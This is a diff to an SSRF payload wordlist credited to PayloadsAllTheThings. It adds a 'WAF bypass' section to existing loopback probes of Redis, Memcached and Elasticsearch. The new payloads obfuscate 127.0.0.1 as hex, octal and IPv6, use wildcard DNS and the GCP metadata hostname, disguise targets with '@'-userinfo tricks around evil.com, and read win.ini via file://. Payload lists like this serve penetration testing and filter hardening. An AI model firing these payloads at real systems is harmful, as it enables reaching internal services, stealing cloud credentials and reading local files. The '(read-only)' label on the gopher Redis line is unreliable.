@@ -1,6 +1,6 @@
 # Server-Side Request Forgery (SSRF) payloads
 # Source: https://github.com/swisskyrepo/PayloadsAllTheThings
-# Total: 77 payloads
+# Total: 97 payloads
 http://127.0.0.1/
 http://localhost/
 http://127.0.0.1:80/
@@ -80,3 +80,30 @@ gopher://127.0.0.1:6379/_INFO
 dict://127.0.0.1:11211/stat
 http://0.0.0.0:80/
 http://127.0.0.1:9200/_cat/indices
+
+# --- WAF bypass ---
+# decimal/octal/hex IP
+http://0x7f.0.0.1/
+http://017700000001/
+http://127.1/
+http://127.0.1/
+http://127.000.000.001/
+# IPv6 / IPv4-mapped
+http://[::ffff:7f00:1]/
+http://[0:0:0:0:0:ffff:127.0.0.1]/
+http://[0:0:0:0:0:0:0:1]/
+http://[fd00::1]/
+http://[fe80::1]/
+# DNS rebinding / wildcard resolvers
+http://127.0.0.1.sslip.io/
+http://metadata.google.internal./
+# userinfo @ obfuscation
+http://user@127.0.0.1/
+http://127.0.0.1@evil.com/
+http://evil.com@127.0.0.1/
+http://127.0.0.1%2f@evil.com/
+http://127.0.0.1#@evil.com/
+http://127.0.0.1:80@evil.com/
+# non-http schemes (read-only)
+gopher://127.0.0.1:6379/_PING
+file:///c:/windows/win.ini
